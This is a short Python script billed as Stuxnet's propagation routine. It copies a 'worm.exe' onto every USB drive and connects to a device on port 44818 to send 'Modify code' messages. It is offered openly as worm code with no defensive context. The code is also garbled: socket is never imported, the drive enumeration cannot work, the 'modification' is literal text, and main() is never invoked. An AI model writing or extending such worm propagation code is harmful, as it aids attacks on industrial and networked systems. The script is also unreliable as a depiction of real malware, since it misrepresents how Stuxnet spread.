# Stuxnet Propagation Through USB Drives and Networks
import os
import shutil
from datetime import datetime

def propagate_via_usb():
    # Get list of all USB drives connected to the system
    usb_drives = [d for d in os.listdir("\\\\.\\") if d.startswith("USB")]

    # Iterate through each USB drive and copy the worm to it
    for usb_drive in usb_drives:
        print(f"Copying worm to {usb_drive}")
        shutil.copy("worm.exe", f"\\\\.\\{usb_drive}\\")

def propagate_via_network():
    # Connect to the target network
    net = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    net.connect(("192.168.1.1", 44818))

    # Send worm to the target device
    net.send(b"Ping\r\n")
    response = net.recv(1024)
    if b"Pong" in response:
        net.send(b"Modify code\r\n")
        net.send(b"code modified\r\n")
        net.close()
        print("Worm successfully sent to target device")
    else:
        net.send(b"Failed to modify code\r\n")
        net.close()
        print("Failed to send worm to target device")

def main():
    # Propagate via USB drives
    propagate_via_usb()

    # Propagate via network
    propagate_via_network()